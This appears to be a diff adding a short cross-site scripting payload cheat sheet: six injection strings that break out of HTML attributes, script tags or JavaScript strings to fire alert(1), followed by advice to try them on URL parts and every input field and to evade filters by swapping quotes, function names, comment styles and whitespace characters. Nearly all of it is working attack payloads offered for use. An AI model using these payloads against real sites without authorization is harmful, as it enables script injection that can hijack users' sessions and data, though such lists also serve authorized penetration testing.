@@ -1,0 +1,14 @@
+"><img src onerror=alert(1)>
+"autofocus onfocus=alert(1)//
+</script><script>alert(1)</script>
+'-alert(1)-'
+\'-alert(1)//
+javascript:alert(1)
+Try it on:
+- URL query, fragment & path;
+- all input fields.
+It's not filter aware and you might need to change:
+1. " for ' and vice versa according to where injection lands
+2. alert(1) for (confirm)(1) or confirm`1`
+3. // for <!--
+4. spaces for / or %0A, %0C or %0D.
